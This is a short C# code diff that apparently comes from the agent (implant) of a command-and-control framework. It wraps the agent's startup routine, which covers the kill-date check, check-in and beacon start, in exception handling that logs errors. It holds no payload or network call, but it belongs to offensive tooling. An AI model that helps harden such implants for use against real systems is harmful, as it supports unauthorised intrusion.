@@ -29,15 +29,24 @@ namespace Agent
         }
         public async Task Start()
         {
-            if (!this.CheckKillDate())
+            try
             {
-                logger.Log("killdate reached, exiting.");
-                Environment.Exit(0);
+                if (!this.CheckKillDate())
+                {
+                    logger.Log("killdate reached, exiting.");
+                    Environment.Exit(0);
+                }
+                await this.CheckIn();
+                logger.Log("Starting beacon.");
+                await this._profile.StartBeacon();
+                logger.Log("Beacon exited.");
             }
-            await this.CheckIn();
-            logger.Log("Starting beacon.");
-            await this._profile.StartBeacon();
-            logger.Log("Beacon exited.");
+            catch(Exception e)
+            {
+                logger.Log("Beacon exited.");
+                logger.Log(e.Message);
+                logger.Log(e.StackTrace);
+            }
         }
         private IProfile SelectProfile(int index)
         {
